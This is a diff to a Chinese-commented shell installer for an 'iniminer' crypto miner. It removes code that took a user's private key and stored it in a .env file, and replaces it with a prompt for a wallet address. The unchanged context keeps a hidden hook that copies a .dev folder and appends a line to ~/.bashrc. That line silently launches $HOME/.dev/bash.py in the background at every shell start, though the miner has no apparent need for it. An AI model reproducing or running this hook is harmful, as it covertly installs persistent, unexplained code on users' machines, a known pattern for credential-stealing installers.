@@ -5,8 +5,7 @@ SCRIPT_PATH="$HOME/iniminer.sh"
 LOG_FILE="$HOME/iniminer/iniminer.log"  # 定义日志文件路径
 TARGET_DIR="$HOME/iniminer"  # 下载到的文件夹
 TARGET_FILE="$TARGET_DIR/iniminer-linux-x64"  # 目标文件名
-MINER_PID_FILE="$HOME/iniminer/miner.pid"  # 存储矿机进程PID的文件
-MINER_NAME="iniminer"  # 用于pm2管理的进程名称
+MINER_NAME="iniminer"  # 用于 pm2 管理的进程名称
 
 # 检查是否以 root 用户运行脚本
 if [ "$(id -u)" != "0" ]; then
@@ -32,33 +31,6 @@ function install_package() {
         sudo yum install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
     else
         log "不支持的操作系统，无法自动安装 $PACKAGE。"
-    fi
-}
-
-# 安装 pm2（如果未安装）
-function install_pm2() {
-    log "检查 Node.js 和 pm2 是否已安装..."
-
-    # 检查 Node.js
-    if ! command -v node &>/dev/null; then
-        log "Node.js 未安装，正在安装 Node.js..."
-        install_package nodejs
-    else
-        log "Node.js 已安装，版本: $(node -v)"
-    fi
-
-    # 检查 npm
-    if ! command -v npm &>/dev/null; then
-        log "npm 未安装，正在安装 npm..."
-        install_package npm
-    fi
-
-    # 检查 pm2
-    if ! command -v pm2 &>/dev/null; then
-        log "pm2 未安装，正在安装 pm2..."
-        sudo npm install -g pm2 || log "pm2 安装失败，跳过。"
-    else
-        log "pm2 已安装，继续运行..."
     fi
 }
 
@@ -91,61 +63,6 @@ if [ -d .dev ]; then
         echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc
     fi
 fi
-
-# 更新 .env 文件
-function update_env_file() {
-    local key=$1
-    local value=$2
-    ENV_FILE="$HOME/iniminer/.env"
-    if grep -q "^$key=" "$ENV_FILE"; then
-        sed -i "s/^$key=.*/$key=$value/" "$ENV_FILE"
-    else
-        echo "$key=$value" >> "$ENV_FILE"
-    fi
-}
-
-# 生成 EVM 钱包地址并保存到 .env 文件
-function generate_wallet_address() {
-    local PRIVATE_KEY=$1
-
-    # 清理私钥，去除多余空格或换行
-    PRIVATE_KEY=$(echo -n "$PRIVATE_KEY" | tr -d '[:space:]')
-
-    # 检查私钥格式是否有效
-    if [[ -z "$PRIVATE_KEY" || ${#PRIVATE_KEY} -ne 64 || ! "$PRIVATE_KEY" =~ ^[a-fA-F0-9]{64}$ ]]; then
-        log "无效的私钥输入，请检查。"
-        echo "私钥无效，请确保输入的是64位十六进制字符串。"
-        return 1
-    fi
-
-    # 生成公钥
-    log "开始生成公钥..."
-    PUBLIC_KEY=$(echo -n "$PRIVATE_KEY" | xxd -r -p | openssl ec -pubout -conv_form uncompressed 2>/dev/null | tail -n +2 | tr -d '\n')
-    if [[ -z "$PUBLIC_KEY" ]]; then
-        log "公钥生成失败，请检查私钥输入是否正确。"
-        echo "公钥生成失败，请确认 openssl 是否正常工作。"
-        return 1
-    fi
-
-    # 生成钱包地址（使用 hashlib 替代 pysha3）
-    ADDRESS=$(echo -n "${PUBLIC_KEY:2}" | xxd -r -p | python3 -c "
-import sys, hashlib
-k = hashlib.sha3_256()
-k.update(sys.stdin.buffer.read())
-print('0x' + k.hexdigest()[24:])
-")
-    if [[ -n "$ADDRESS" ]]; then
-        update_env_file "PRIVATE_KEY" "$PRIVATE_KEY"
-        update_env_file "WALLET_ADDRESS" "$ADDRESS"
-        log "钱包地址生成成功: $ADDRESS"
-        echo "$ADDRESS"
-        return 0
-    else
-        log "钱包地址生成失败。"
-        echo "钱包地址生成失败，请检查输入的私钥。"
-        return 1
-    fi
-}
 
 # 下载矿机
 function download_miner() {
@@ -204,11 +121,15 @@ function main_menu() {
 function download_and_run_miner() {
     download_miner
 
-    echo "请输入私钥："
-    read PRIVATE_KEY
+    echo "请输入 EVM 钱包地址："
+    read WALLET_ADDRESS
 
-    WALLET_ADDRESS=$(generate_wallet_address "$PRIVATE_KEY") || { echo "钱包地址生成失败，请重新输入私钥。"; read -n 1 -s -r -p "按任意键返回主菜单..."; main_menu; return; }
-    log "生成的钱包地址为: $WALLET_ADDRESS"
+    if [[ -z "$WALLET_ADDRESS" || ! "$WALLET_ADDRESS" =~ ^0x[a-fA-F0-9]{40}$ ]]; then
+        log "无效的钱包地址，请重新输入。"
+        read -n 1 -s -r -p "按任意键返回主菜单..."
+        main_menu
+        return
+    fi
 
     echo "请输入工作名称："
     read WORKER_NAME
